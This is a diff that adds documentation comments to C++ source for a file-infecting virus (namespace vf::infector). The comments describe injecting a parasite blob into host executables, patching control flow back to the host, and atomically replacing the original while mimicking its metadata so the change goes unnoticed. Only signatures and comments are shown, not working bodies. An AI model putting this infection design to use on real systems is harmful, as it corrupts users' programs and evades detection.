@@ -9,6 +9,14 @@
 
 namespace vf::infector {
 
+// Infect a host with a virus. We will make a copy of the host temporarily
+// that will be modified and then replace the original.
+// @param host_mapping The host executable
+// @param parasite_mapping The virus binary blob.
+// @param tmp_file_name The temporary file name used for modification
+// @param parasite_patch_offset The offset in the infected file to be patched
+// so we can continue running the infected host.
+// @return A file descriptor for the infected host.
 template <typename InfectorT, typename RedirectorT, typename SignerT>
 common::FileDescriptor infect(std::span<const std::byte> host_mapping,
                               std::span<const std::byte> parasite_mapping,
@@ -56,6 +64,13 @@ common::FileDescriptor infect(std::span<const std::byte> host_mapping,
   return output;
 }
 
+// Atomically swap two files. It is used to replace the original host binary
+// with an infected one. We also make sure that file metadata matches.
+// @param host_fd The host file descriptor for the original file.
+// @param host The host file name.
+// @param temp_fd The temporary copy which contains the infected host.
+// @param tmp The file name of the temporary copy.
+// @return True if the swap is successful.
 bool atomic_swap_host(int host_fd, const char* host, int tmp_fd,
                       const char* tmp) {
   // mimic the original file.
@@ -79,6 +94,11 @@ bool atomic_swap_host(int host_fd, const char* host, int tmp_fd,
 // A generic infection routine, that can be used by any algorithms.
 // It creates a temp copy of the host, infects it with a parasite, and then
 // pretend to be the host with atomic rename.
+// @param host_path The path to a host that will be infected.
+// @param parasite_path The path to a virus binary blob.
+// @param parasite_patch_offset The offset of the instruction with in an
+// infected binary that must be patched to return control flow back to the
+// host binary after running the virus.
 template <typename InfectorT, typename RedirectorT, typename SignerT>
 bool infect(const char* host_path, const char* parasite_path,
             size_t parasite_patch_offset) {
